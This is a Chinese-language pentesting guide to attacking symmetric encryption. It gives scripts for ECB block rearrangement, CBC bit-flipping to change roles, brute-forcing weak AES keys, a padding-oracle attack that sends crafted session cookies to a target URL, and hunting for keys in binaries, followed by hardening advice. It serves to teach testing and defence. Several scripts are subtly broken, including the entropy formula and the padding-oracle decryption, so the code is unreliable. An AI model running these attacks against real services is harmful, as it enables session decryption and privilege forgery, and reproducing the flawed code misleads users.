# 对称加密攻击

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供对称加密攻击的方法论。通过本指南，测试人员可以识别和利用对称加密实现中的弱点，包括弱密钥、不当模式使用、密钥重用等问题。

### 1.2 适用范围
本文档适用于以下场景：
- Web 应用对称加密审计
- 配置文件加密分析
- 通信协议加密评估
- 数据存储加密测试
- 许可证/激活机制分析

### 1.3 读者对象
- 渗透测试工程师
- 密码学安全测试人员
- 代码审计人员
- 逆向工程师

---

## 第二部分：核心渗透技术专题

### 专题一：对称加密攻击

#### 2.1 技术介绍

**对称加密攻击**是针对使用相同密钥进行加密和解密的加密系统的攻击技术。即使使用强算法（如 AES），实现缺陷也可能导致加密被攻破。

**常见对称加密问题：**

| 问题 | 描述 | 风险等级 |
|------|------|---------|
| 弱密钥 | 密钥长度不足或可预测 | 严重 |
| ECB 模式 | 电子密码本模式泄露模式 | 高危 |
| IV 重用 | 相同密钥和 IV 重用 | 高危 |
| 密钥硬编码 | 密钥写在代码中 | 严重 |
| 无认证 | 缺少完整性验证 | 中 - 高危 |
| 填充漏洞 | PKCS#7 填充检查不当 | 高危 |

**对称加密算法对比：**

| 算法 | 密钥长度 | 安全性 | 备注 |
|------|---------|--------|------|
| AES | 128/192/256 | ✅ 安全 | 推荐标准 |
| 3DES | 112/168 | ⚠️ 已弃用 | Sweet32 攻击 |
| DES | 56 | ❌ 已破解 | 不应使用 |
| RC4 | 可变 | ❌ 已破解 | 不应使用 |
| Blowfish | 可变 | ⚠️ 注意 | 64 位块大小 |
| ChaCha20 | 256 | ✅ 安全 | 移动设备友好 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 配置加密 | 数据库密码加密存储 | 使用弱密钥或 ECB 模式 |
| 会话管理 | 加密 Session ID | IV 重用导致预测 |
| 文件加密 | 上传文件加密 | 密钥管理不当 |
| 许可证验证 | 软件激活码 | 加密可逆向 |
| 支付数据 | 卡号加密 | PCI DSS 合规问题 |
| Cookie 加密 | 用户信息 Cookie | 可解密或篡改 |

#### 2.3 漏洞检测方法

##### 2.3.1 识别加密算法

```python
#!/usr/bin/env python3
"""
加密算法识别脚本
"""
import re

def identify_encryption(ciphertext):
    """根据密文特征识别可能的加密算法"""
    
    # Base64 解码尝试
    import base64
    try:
        decoded = base64.b64decode(ciphertext)
        data = decoded
    except:
        data = bytes.fromhex(ciphertext) if re.match(r'^[0-9a-fA-F]+$', ciphertext) else ciphertext.encode()
    
    length = len(data)
    
    # AES 检测（16 字节倍数）
    if length % 16 == 0 and length >= 32:
        print(f"[+] 可能是 AES 加密（块大小：{length} 字节）")
        
        # 检测 ECB 模式
        blocks = [data[i:i+16] for i in range(0, length, 16)]
        if len(blocks) != len(set(blocks)):
            print("[!] 检测到 ECB 模式特征（重复块）")
    
    # DES/3DES 检测（8 字节倍数）
    elif length % 8 == 0 and length >= 16:
        print(f"[+] 可能是 DES/3DES 加密（块大小：{length} 字节）")
    
    # RC4 检测（流加密，无块特征）
    else:
        print(f"[?] 可能是流加密（如 RC4）或自定义加密")
    
    # 熵值分析
    from collections import Counter
    entropy = -sum((c/length) * (c/length).bit_length() for c in Counter(data).values())
    print(f"    熵值：{entropy:.2f} bits/byte")

# 使用示例
# identify_encryption("U2FsdGVkX1+...")
```

##### 2.3.2 代码审计检测

```bash
# 搜索常见加密实现
grep -r "Cipher.getInstance" --include="*.java" .
grep -r "AES/ECB" --include="*.java" --include="*.py" .
grep -r "SecretKeySpec" --include="*.java" .
grep -r "AES\.new" --include="*.py" .

# 搜索硬编码密钥
grep -riE "(secret|password|key|passwd).*=.*['\"][^'\"]{8,}['\"]" --include="*.py" --include="*.js" --include="*.java" .

# 搜索 IV 使用
grep -r "IvParameterSpec\|iv.*=" --include="*.java" --include="*.py" .
```

##### 2.3.3 常见不安全实现

```java
// ❌ 不安全 - ECB 模式
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");

// ❌ 不安全 - 固定 IV
IvParameterSpec iv = new IvParameterSpec("0000000000000000".getBytes());

// ❌ 不安全 - 硬编码密钥
SecretKeySpec key = new SecretKeySpec("mysecretkey12345".getBytes(), "AES");

// ✅ 安全 - CBC 模式 + 随机 IV
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
SecureRandom random = new SecureRandom();
byte[] iv = new byte[16];
random.nextBytes(iv);
IvParameterSpec ivSpec = new IvParameterSpec(iv);
```

```python
# ❌ 不安全 - ECB 模式
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_ECB)

# ❌ 不安全 - 固定 IV
iv = b'\x00' * 16
cipher = AES.new(key, AES.MODE_CBC, iv)

# ❌ 不安全 - 密钥长度不足
key = b'short'  # 仅 5 字节

# ✅ 安全 - GCM 模式
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
nonce = get_random_bytes(12)
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
```

#### 2.4 漏洞利用方法

##### 2.4.1 ECB 模式攻击

```python
#!/usr/bin/env python3
"""
ECB 模式攻击 - 密文重排
"""
import base64
from Crypto.Cipher import AES

def ecb_cut_and_paste_attack(ciphertext_b64, block_size=16):
    """
    ECB 密文剪切粘贴攻击
    通过重排密文块改变解密后的明文
    """
    ciphertext = base64.b64decode(ciphertext_b64)
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    
    print(f"[*] 原始块数：{len(blocks)}")
    
    # 示例：重排块顺序
    # 假设结构：[用户名块][角色=user][填充]
    # 目标：改为 [用户名块][角色=admin][填充]
    
    # 如果有已知的 admin 密文块，可以替换
    # 这里演示块重排
    rearranged = blocks.copy()
    
    # 交换块（具体取决于实际数据结构）
    if len(blocks) >= 3:
        rearranged[1], rearranged[2] = rearranged[2], rearranged[1]
    
    new_ciphertext = b''.join(rearranged)
    return base64.b64encode(new_ciphertext).decode()

# 使用示例
# modified = ecb_cut_and_paste_attack(original_ciphertext)
```

##### 2.4.2 CBC 比特翻转攻击

```python
#!/usr/bin/env python3
"""
CBC 比特翻转攻击
修改前一个密文块来改变下一个块的解密结果
"""
import base64

def cbc_bit_flip(ciphertext_b64, block_index, flip_positions):
    """
    CBC 比特翻转攻击
    
    block_index: 要影响的目标块索引（从 1 开始）
    flip_positions: 字典 {字节位置：翻转值}
    """
    ciphertext = bytearray(base64.b64decode(ciphertext_b64))
    block_size = 16
    
    # 修改前一个块的对应字节
    prev_block_start = (block_index - 1) * block_size
    
    for pos, flip_value in flip_positions.items():
        ciphertext[prev_block_start + pos] ^= flip_value
    
    return base64.b64encode(ciphertext).decode()

# 使用示例
# 假设要将 "role=user" 改为 "role=admin"
# 'u' (0x75) XOR ? = 'a' (0x61)
# ? = 0x75 XOR 0x61 = 0x14
flip = {0: 0x14}  # 翻转第一个字节
# modified = cbc_bit_flip(ciphertext, block_index=2, flip_positions=flip)
```

##### 2.4.3 弱密钥爆破

```python
#!/usr/bin/env python3
"""
弱密钥爆破攻击
"""
from Crypto.Cipher import AES
import base64
import itertools

def bruteforce_aes_key(ciphertext_b64, known_plaintext, key_pattern):
    """
    爆破 AES 密钥
    
    key_pattern: 密钥模式，如 '????' 表示 4 字符密钥
    """
    ciphertext = base64.b64decode(ciphertext_b64)
    
    # 生成密钥候选
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    
    for length in range(1, 9):  # 尝试 1-8 字符密钥
        for candidate in itertools.product(charset, repeat=length):
            key = ''.join(candidate).encode()
            key = key.ljust(16, b'\x00')  # 填充到 16 字节
            
            try:
                cipher = AES.new(key, AES.MODE_ECB)
                plaintext = cipher.decrypt(ciphertext[:16])
                
                # 检查是否匹配已知明文
                if known_plaintext.encode() in plaintext:
                    print(f"[+] 找到密钥：{key}")
                    return key
            except:
                continue
    
    print("[-] 未找到密钥")
    return None
```

##### 2.4.4 Padding Oracle 攻击

```python
#!/usr/bin/env python3
"""
Padding Oracle 攻击完整实现
"""
import requests
import base64

class PaddingOracle:
    def __init__(self, target_url, cookie_name):
        self.url = target_url
        self.cookie_name = cookie_name
        self.block_size = 16
    
    def is_valid_padding(self, ciphertext_hex):
        """检查填充是否有效"""
        cookies = {self.cookie_name: ciphertext_hex}
        resp = requests.get(self.url, cookies=cookies)
        
        # 根据响应判断
        # 通常 200=有效，500=无效
        return resp.status_code == 200
    
    def decrypt_block(self, ciphertext_block, iv):
        """解密单个块"""
        intermediate = bytearray(self.block_size)
        
        for byte_idx in range(self.block_size):
            pad_value = byte_idx + 1
            
            # 构造攻击 IV
            attack_iv = bytearray(b'\x00' * (self.block_size - pad_value))
            
            # 设置已解密字节的填充
            for i in range(byte_idx):
                attack_iv.insert(0, intermediate[i] ^ pad_value)
            
            # 爆破当前字节
            for guess in range(256):
                test_iv = bytes(attack_iv) + bytes([guess])
                
                if self.is_valid_padding(
                    (test_iv + ciphertext_block).hex()
                ):
                    # 找到正确填充
                    intermediate_byte = guess ^ pad_value
                    intermediate.insert(0, intermediate_byte)
                    break
        
        return bytes(intermediate)
    
    def decrypt(self, ciphertext_b64):
        """解密完整密文"""
        ciphertext = base64.b64decode(ciphertext_b64)
        
        blocks = [ciphertext[i:i+self.block_size] 
                  for i in range(0, len(ciphertext), self.block_size)]
        
        iv = blocks[0]
        plaintext = b''
        
        for i in range(1, len(blocks)):
            decrypted = self.decrypt_block(blocks[i], iv)
            plaintext += decrypted
            iv = blocks[i]
        
        # 移除 PKCS7 填充
        pad_len = plaintext[-1]
        return plaintext[:-pad_len]

# 使用示例
# oracle = PaddingOracle("https://target.com/api", "session")
# plaintext = oracle.decrypt(ciphertext_b64)
```

##### 2.4.5 密钥提取攻击

```python
#!/usr/bin/env python3
"""
从二进制文件中提取 AES 密钥
"""
import re

def extract_aes_keys_from_binary(file_path):
    """从二进制文件提取可能的 AES 密钥"""
    
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # AES 密钥通常是 16、24 或 32 字节的高熵数据
    key_sizes = [16, 24, 32]
    found_keys = []
    
    for key_size in key_sizes:
        # 滑动窗口查找
        for i in range(0, len(data) - key_size, 1):
            candidate = data[i:i+key_size]
            
            # 简单熵检测
            unique_bytes = len(set(candidate))
            if unique_bytes > key_size * 0.6:  # 高熵
                found_keys.append({
                    'offset': i,
                    'size': key_size,
                    'key': candidate.hex()
                })
    
    return found_keys

# 使用示例
# keys = extract_aes_keys_from_binary('app.bin')
# for key in keys:
#     print(f"可能密钥 @ {key['offset']}: {key['key']}")
```

#### 2.5 安全配置建议

##### 2.5.1 对称加密最佳实践

```python
# ✅ 安全 AES 实现示例
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

def encrypt_aes_gcm(plaintext, key):
    """使用 AES-GCM 模式加密（推荐）"""
    nonce = get_random_bytes(12)  # 96 位 nonce
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    
    # 返回：nonce + tag + ciphertext
    return base64.b64encode(nonce + tag + ciphertext).decode()

def decrypt_aes_gcm(ciphertext_b64, key):
    """使用 AES-GCM 模式解密"""
    data = base64.b64decode(ciphertext_b64)
    nonce = data[:12]
    tag = data[12:28]
    ciphertext = data[28:]
    
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext.decode()

# 密钥生成
key = get_random_bytes(32)  # AES-256
```

##### 2.5.2 加密模式选择

| 模式 | 安全性 | 性能 | 推荐用途 |
|------|--------|------|---------|
| GCM | ✅ 高 | 高 | 通用加密（推荐） |
| CCM | ✅ 高 | 中 | 受限环境 |
| CBC | ⚠️ 中 | 高 | 遗留兼容 |
| CTR | ✅ 高 | 高 | 流式加密 |
| ECB | ❌ 低 | 高 | **禁止使用** |

##### 2.5.3 对称加密检查清单

- [ ] 使用 AES-256 或 ChaCha20
- [ ] 使用认证加密模式（GCM、CCM）
- [ ] 每次加密使用唯一 nonce/IV
- [ ] 密钥安全存储（KMS、HSM）
- [ ] 实施密钥轮换
- [ ] 不使用 ECB 模式
- [ ] 不硬编码密钥
- [ ] 验证填充（防止 Padding Oracle）

---

## 第三部分：附录

### 3.1 对称加密攻击工具

| 工具 | 用途 |
|-----|------|
| CyberChef | 加密解密分析 |
| Python pycryptodome | 加密原语测试 |
| Burp Suite | Web 加密测试 |
| hashcat | 密钥爆破 |

### 3.2 常见加密错误

| 错误 | 后果 | 修复 |
|-----|------|------|
| ECB 模式 | 模式泄露 | 使用 GCM/CBC |
| IV 重用 | 密钥流重用 | 随机 IV |
| 无认证 | 可篡改 | 使用 GCM 或 HMAC |
| 弱密钥 | 可爆破 | 增加密钥长度 |
| 硬编码 | 密钥泄露 | 使用 KMS |

---

## 参考资源

- [NIST SP 800-38A - Block Cipher Modes](https://csrc.nist.gov/publications/detail/sp/800-38a/final)
- [NIST SP 800-38D - GCM Mode](https://csrc.nist.gov/publications/detail/sp/800-38d/final)
- [Padding Oracle Attack - Wikipedia](https://en.wikipedia.org/wiki/Padding_oracle_attack)
- [Cryptopals Crypto Challenges](https://cryptopals.com/)
